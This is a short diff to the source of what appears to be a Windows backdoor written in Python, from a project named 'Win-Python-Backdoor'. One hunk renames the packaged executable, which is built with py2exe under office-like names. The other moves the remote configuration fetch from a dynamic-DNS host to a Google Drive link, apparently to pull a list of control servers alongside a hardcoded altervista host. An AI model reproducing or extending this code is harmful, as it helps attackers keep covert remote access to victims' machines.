@@ -43,7 +43,7 @@ import requests
 #copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wofficeie1.py" C:\Python27_64
 #.\python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie164.py" py2exe
 #.\python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie1.py" py2exe
-#copy /y C:\python27\dist\wofficeie1.exe %USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wup.exe
+#copy /y C:\python27\dist\wofficeie1.exe %USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wup1.exe
 def get_macaddress(host='localhost'):
     """ Returns the MAC address of a network host, requires >= WIN2K. """
     # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/347812
@@ -188,7 +188,7 @@ def myloop():
     #ua = UserAgent()
     #header = {'User-Agent':str(ua.chrome)}
     header = {'User-Agent': 'Mozilla/5.0'}
-    mainsite = requests.get("http://config02.addns.org/site.txt", headers=header)
+    mainsite = requests.get("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF", headers=header)
     #print mainsite.text
     sites = ["paner.altervista.org"]#, mainsite.text]
     sites.extend(mainsite.text.split(",") )
